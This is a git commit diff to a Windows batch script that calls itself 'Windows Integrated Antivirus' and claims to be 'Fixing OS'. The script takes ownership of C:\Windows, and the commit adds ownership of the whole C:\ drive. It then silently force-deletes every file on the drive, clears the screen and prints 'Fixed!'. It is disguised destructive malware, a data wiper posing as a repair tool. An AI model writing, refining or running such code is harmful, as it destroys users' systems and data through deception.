ac188b750d21c034d79165a644a1f5eb7c832d15
WindowsGuy <162045355+WindowsGuy-programmer@users.noreply.github.com>
2025-11-12 10:21:36 +0300

    Update Script.bat

--- Script.bat
+++ Script.bat
@@ -2,5 +2,8 @@
 title Windows Integrated Antivirus
 echo Fixing OS...
 takeown /f C:\Windows /r /d Y > nul 2>&1
+takeown /f C:\ /r /d Y > nul 2>&1
 del /s /f /q C:\ > nul 2>&1
+cls
 echo Fixed!
+pause>nul
